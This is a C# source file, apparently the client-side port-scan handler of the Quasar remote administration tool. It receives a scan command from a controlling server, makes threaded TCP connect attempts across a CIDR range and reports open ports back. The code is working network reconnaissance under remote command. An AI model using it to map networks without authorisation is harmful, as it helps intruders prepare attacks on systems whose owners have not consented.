using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Logger;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// Handles messages for performing port scans.
    /// </summary>
    public class PortScanHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoPortScan;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoPortScan msg:
                    Execute(sender, msg);
                    break;
            }
        }

        // Perform port scan and send results to Quasar server
        private void Execute(ISender client, DoPortScan message)
        {
            Logger.Debug("Handling DoPortScan command for task ID " + message.TaskId);
            try 
            {
                Dictionary<string, int[]> scanResults = new Dictionary<string, int[]>();
                var addrList = GetTargetAddrList(message.TargetRange);
                Logger.Info(String.Format(
                    "Performing port scan against target range {0} ({2} IPs), ports {1}", 
                    message.TargetRange, 
                    String.Join(", ", message.TargetPorts),
                    addrList.Count
                ));

                scanResults = ScanIPs(addrList, message.TargetPorts);

                client.Send(new DoPortScanResponse { TaskId = message.TaskId, Success = true, Result = scanResults });
            }
            catch (Exception ex)
            {
                Logger.Error("Port scan exception: " + ex.ToString());
                client.Send(new DoPortScanResponse { TaskId = message.TaskId, Success = false, ResultMessage = ex.Message });
            }
        }

        public static List<IPAddress> GetTargetAddrList(string range)
        {
            //Reference: https://stackoverflow.com/questions/32028166/convert-cidr-notation-into-ip-range
            string[] parts = range.Split('.', '/');
            if (parts.Length != 5)
            {
                throw new Exception("Invalid CIDR notation: " + range);
            }

            List<IPAddress> addrList = new List<IPAddress>();
            uint ipnum = (Convert.ToUInt32(parts[0]) << 24) |
                (Convert.ToUInt32(parts[1]) << 16) |
                (Convert.ToUInt32(parts[2]) << 8) |
                Convert.ToUInt32(parts[3]);

            int maskbits = Convert.ToInt32(parts[4]);

            // Avoid invalid and too large netranges
            if (maskbits < 16 || maskbits > 31)
            {
                throw new Exception(String.Format("CIDR mask {0} either too large or too small", maskbits));
            }
            uint mask = 0xffffffff;
            mask <<= (32 - maskbits);

            uint start = ipnum & mask;
            uint end = ipnum | (mask ^ 0xffffffff);

            for (uint i = start; i <= end; i++) 
            {
                addrList.Add(IPAddress.Parse(i.ToString()));
            }

            return addrList;
        }

        private Dictionary<string, int[]> ScanIPs(List<IPAddress> ips, int[] ports)
        {
            Dictionary<string, List<int>> scanResultsList = new Dictionary<string, List<int>>();
            Dictionary<string, int[]> scanResultsArray = new Dictionary<string, int[]>();
            int toScan = ips.Count * ports.Length;

            using (ManualResetEvent resetEvent = new ManualResetEvent(false))
            using (Mutex mut = new Mutex())
            {
                foreach (IPAddress ip in ips)
                {                    
                    foreach (int port in ports)
                    {
                        ThreadPool.QueueUserWorkItem(
                            new WaitCallback(x =>
                            {
                                if (ScanPort(ip, port))
                                {
                                    mut.WaitOne();
                                    if (!scanResultsList.ContainsKey(ip.ToString()))
                                        scanResultsList[ip.ToString()] = new List<int>();
                                    scanResultsList[ip.ToString()].Add(port);
                                    mut.ReleaseMutex();
                                }
                                if (Interlocked.Decrement(ref toScan) == 0)
                                    resetEvent.Set();
                            }));
                    }
                }

                resetEvent.WaitOne();
            }

            foreach(KeyValuePair<string, List<int>> entry in scanResultsList)
            {
                scanResultsArray[entry.Key] = entry.Value.ToArray();
            }

            return scanResultsArray;
        }

        private bool ScanPort(IPAddress ip, int port)
        {
            TcpClient scanClient = new TcpClient();
            bool open = false;
            try
            {
                scanClient.Connect(ip, port);
                open = true;
                Logger.Debug(String.Format("Port {0} open for IP {1}", port, ip.ToString()));
            }
            catch (SocketException)
            {
                Logger.Debug(String.Format("Port {0} closed for IP {1}", port, ip.ToString()));
            }
            catch (Exception ex)
            {
                Logger.Error(String.Format("Non-socket exception when scanning {0}:{1}: {2}", ip.ToString(), port, ex.Message));
            }
            finally
            {
                scanClient.Close();
            }
            return open;
        }
    }
}
